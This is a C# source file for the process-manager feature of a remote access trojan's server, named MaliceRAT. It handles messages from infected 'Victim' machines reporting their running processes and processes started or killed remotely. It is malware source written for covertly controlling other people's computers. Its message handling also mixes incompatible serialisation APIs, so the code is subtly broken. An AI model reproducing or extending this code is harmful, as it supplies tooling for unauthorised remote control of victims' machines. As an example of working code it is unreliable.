using System;
using System.Collections.Generic;
using System.Web.Script.Serialization;

namespace MaliceRAT.RatServer.Features
{
    public class ProcessManager
    {
        #region Events
        public event Action<Victim, List<ProcessInfo>> OnProcessListReceived;
        public event Action<Victim, string, string, int> OnProcessStarted;
        public event Action<Victim, string, string, int> OnProcessStopped;
        #endregion

        #region Variables
        private Server server;
        #endregion

        #region Constructor
        public ProcessManager(Server server)
        {
            this.server = server;
            server.MessageReceived += OnMessageReceived;
        }
        #endregion

        #region Methods
        private void OnMessageReceived(Victim victim, dynamic message)
        {
            if (message["type"] == "pm_list")
            {
                var serializer = new JavaScriptSerializer();
                var processes = serializer.Deserialize<List<ProcessInfo>>(message["data"].ToString());
                OnProcessListReceived?.Invoke(victim, processes);
            }
            else if (message["type"] == "pm_start")
            {
                string displayName = message["DisplayName"].ToString();
                string processName = message["ProcessName"].ToString();
                int pid = message["pid"].ToObject<int>();
                OnProcessStarted?.Invoke(victim, displayName, processName, pid);
            }
            else if (message["type"] == "pm_kill")
            {
                string displayName = message["DisplayName"].ToString();
                string processName = message["ProcessName"].ToString();
                int pid = message["pid"].ToObject<int>();
                OnProcessStopped?.Invoke(victim, displayName, processName, pid);
            }
        }
        #endregion

        #region Helper Classes
        public class ProcessInfo
        {
            public string ProcessName { get; set; }
            public string DisplayName { get; set; }
            public int Pid { get; set; }
        }
        #endregion
    }
}